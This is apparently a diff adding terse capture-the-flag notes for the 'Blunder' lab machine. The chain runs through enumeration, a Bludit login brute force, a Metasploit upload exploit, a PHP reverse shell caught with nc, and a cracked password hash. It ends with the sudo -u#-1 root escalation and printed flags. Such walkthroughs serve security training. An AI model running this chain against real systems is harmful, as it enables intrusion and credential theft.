@@ -1,0 +1,71 @@
+nmap -sC -sV -oN nmap 10.10.10.191 -v -A
+
+port 80 + 21 (ftp closed)
+
+/admin -> bludit login page
+code source -> version 3.9.2 -> login bypass by bruteforce
+https://rastating.github.io/bludit-brute-force-mitigation-bypass/
+
+custom wordlist = cewl to dump all words from page
+cewl http://10.10.10.191 > site_words
+
+to get user:
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.191/ --extensions .txt
+-> fergus on todo.txt
+
+script -> password = RolandDeschain
+
+file upload exploit:
+Bludit - Directory Traversal Image File Upload (Metasploit)  | php/remote/47699.rb
+
+meterpreter session, in /var/www/bludit-3.9.2/bl-content
+> upload php-reverse-shell.php
+go to it after nc -> shell as www-data
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+upload LinEnum.sh throught nc in /tmp
+
+in /home:
+hugo
+shaun
+
+in /var/www/bludit-3.10.0a/bl-content/databases/users.php
+
+```
+<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+```
+
+crackstation = Password120
+
+su hugo with pass, get user flag:
+dbc21f54284dfb080b785d3c59242c93
+
+sudo -l
+User hugo may run the following commands on blunder:
+    (ALL, !root) /bin/bash
+
+https://www.exploit-db.com/exploits/47502
+-> sudo -u#-1 /bin/bash
+
+shell as root:
+c8ebb8a0a90170a934452996c79922e6
